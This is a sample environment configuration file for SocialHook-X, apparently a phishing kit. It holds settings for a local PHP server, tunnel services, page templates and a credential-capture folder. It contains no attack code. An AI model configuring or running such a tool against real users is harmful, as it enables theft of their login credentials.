# SocialHook-X Environment Configuration
# Copy this to .env and modify as needed

# Environment Type (development or production)
SHX_ENV=development

# Server Configuration
SHX_HOST=127.0.0.1
SHX_PORT=8080
SHX_PHP_PORT=8081

# Security
SHX_SECRET_KEY=change-this-to-random-key
SHX_DEBUG=False

# Logging
SHX_LOG_LEVEL=INFO
SHX_LOG_FILE=logs/socialhook-x.log

# Default Tunnel Service
SHX_DEFAULT_TUNNEL=localhost

# Tunnel Configuration
SHX_TUNNEL_TIMEOUT=30
SHX_TUNNEL_RETRIES=3

# Output Settings
SHX_OUTPUT_DIR=output
SHX_OUTPUT_FORMAT=txt

# Template Settings
SHX_TEMPLATE_TIMEOUT=300

# Credential Capture
SHX_CAPTURE_LOGS=True
SHX_CAPTURE_DIR=captured_data

# Advanced Settings
SHX_ENABLE_ANALYTICS=False
SHX_ENABLE_PLUGINS=True
SHX_PLUGIN_DIR=plugins
